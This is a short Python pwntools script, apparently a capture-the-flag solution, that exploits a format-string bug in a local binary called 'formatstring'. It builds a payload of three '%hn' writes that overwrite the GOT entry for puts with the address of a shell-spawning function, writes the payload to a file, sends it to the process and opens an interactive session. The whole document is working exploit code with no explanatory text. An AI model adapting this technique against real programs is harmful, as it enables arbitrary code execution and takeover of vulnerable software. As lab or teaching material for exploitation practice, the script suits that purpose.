#!/usr/bin/env python
from pwn import *

pop_shell = 0x400637
puts_got  = 0x601018
# "____%9$p" + "AAAAAAAA"




first  = pop_shell & 0xffff
second = ( 0x10000 + (pop_shell >> 16) - first ) & 0xffff
third = ( 0x10000 + (pop_shell >> 32) - second - first) & 0xffff

print first, second, third


payload  = "%" + str(first).rjust(8-2, "0") + "x"
payload += "%0014$hn"

payload += "%" + str(second).rjust(8-2, "0") + "x"
payload += "%0015$hn"

payload += "%" + str(third).rjust(8-2, "0") + "x"
payload += "%0016$hn"

payload += p64(puts_got) + p64(puts_got+2) + p64(puts_got + 4)

with open("payload", "wb") as f:
    f.write(payload)
    f.close()


p = process("formatstring")
p.sendline(payload)
p.interactive()
